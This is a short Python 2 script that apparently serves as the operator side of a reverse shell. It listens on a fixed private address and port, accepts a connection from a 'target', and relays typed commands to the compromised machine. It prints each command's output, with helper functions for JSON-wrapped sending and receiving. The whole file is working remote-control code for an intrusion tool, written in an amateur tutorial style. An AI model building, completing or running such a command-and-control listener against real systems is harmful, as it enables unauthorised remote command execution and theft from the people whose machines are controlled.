#!/usr/bin/python
import socket
import json # use this inorder to dump the data as bytes as it can


# we gonna send send and receive data as wew want ==
def reliable_send(data):
	json_data = json.dumps(data)
	# print("testing the json send: "+json_data)
	target.send(json_data)

def reliable_rcv():
	json_data = ""
	# run loop to add data
	while True:
		try:
			json_data = json_data + target.recv(1024)
			# print("testing the json data receving: " + json_data)
			# print("print the json loads: "+ json.loads(json_data))
			return json.loads(json_data)
		except ValueError:
			# print("reliable_rcv except (continue)..")
			continue

#==-----------------------------


def shell():
	while True:
		# command to send to client (input)
		command = raw_input("* Shell#~%s: " % str(ip))
		reliable_send(command) # this function send command to client
		if command == "q":
			break
		elif command[:2] == "cd" and len(command) > 1:
			continue
		else:
			result = reliable_rcv() #  receive bytes
			print(result)


def server():
	global s, ip, target
	# create simple connection
	# ipv4 run over tcp
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind(("192.168.88.19",54321))
	s.listen(5) # connection
	print("listening for incoming connection")
	target , ip = s.accept() # accept the connection
	print("connected")


server()
shell()
s.close()
